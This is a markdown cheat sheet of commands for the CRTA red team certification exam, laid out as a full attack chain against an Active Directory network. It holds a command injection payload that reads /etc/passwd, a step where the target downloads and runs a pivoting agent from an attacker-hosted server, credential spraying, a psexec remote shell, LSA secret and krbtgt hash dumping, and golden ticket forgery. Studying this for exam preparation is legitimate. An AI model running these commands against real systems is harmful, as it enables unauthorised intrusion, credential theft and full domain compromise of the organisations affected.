# 🛡️ Red Team Analyst [CRTA] Certification

This guide outlines the main commands used in CRTA exam



## 🔍 1. Recon & Scanning

```bash
# Ping-sweep external network
nmap -sn [TARGET_SUBNET]/24

# Version & script scan on a discovered host
nmap [TARGET_IP] -sC -sV
````

---

## 🌐 2. Web Enumeration & Injection

```bash
# Identify and access web login/signup page
# Inject into vulnerable field (example):
; cat /etc/passwd
```

---

## 🔑 3. Gaining Access via SSH

```bash
# SSH login using harvested credentials
ssh [USERNAME]@[TARGET_IP]

# Enumerate Firefox or browser history
cat ~/.bash_history
```

---

## 🔄 4. Pivoting with Ligolo-NG

```bash
# On attacker machine
./proxy -selfcert

# Host agent binary
python3 -m http.server 8000

# On target
wget http://[ATTACKER_IP]:8000/agent
chmod +x agent
./agent -connect [ATTACKER_IP]:[PORT] -ignore-cert

# Setup tunnel interface
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add [INTERNAL_SUBNET]/24 dev ligolo
```

---

## 🔎 5. Internal Network Scanning

```bash
# Discover hosts in the internal network
sudo nmap [INTERNAL_SUBNET]/24 -sn

# Detailed scans on live hosts
sudo nmap [INTERNAL_IP] -sC -sV
```

---

## 🔓 6. Lateral Movement via SMB

```bash
# Credential spraying
crackmapexec smb [HOSTS_FILE] -u [USER] -p '[PASSWORD]'

# Remote shell
psexec.py [DOMAIN]/[USER]:'[PASSWORD]'@[TARGET]

# Dump secrets
crackmapexec smb [TARGET] -u [USER] -p '[PASSWORD]' --lsa
```

---

## 🧠 7. Domain Escalation

```bash
# View domain controllers
nltest /dclist

# List domain users
net user /domain

# Update local DNS resolution
sudo nano /etc/hosts
# Add: [DC_IP] [FQDN]
```

---

## 🥇 8. Golden Ticket Attack

```bash
# Dump krbtgt hash
secretsdump.py -just-dc-user 'krbtgt' [DOMAIN]/[USER]:'[PASSWORD]'@[DC_HOST]

# Extract domain SID
lookupsid.py [DOMAIN]/[USER]:'[PASSWORD]'@[DC_HOST]

# Create Golden Ticket
ticketer.py \
  -domain [DOMAIN] \
  -aesKey [KRBTGT_HASH] \
  -domain-sid [DOMAIN_SID] \
  -groups 516 \
  -user-id [USER_ID] \
  -extra-sid [EXTRA_SID] \
  [USERNAME]

# Set environment and get service ticket
export KRB5CCNAME=corpmngr.ccache
getST.py -spn 'CIFS/[HOST]' -k -no-pass [DOMAIN]/[USER]
```

---

## ✅ Notes


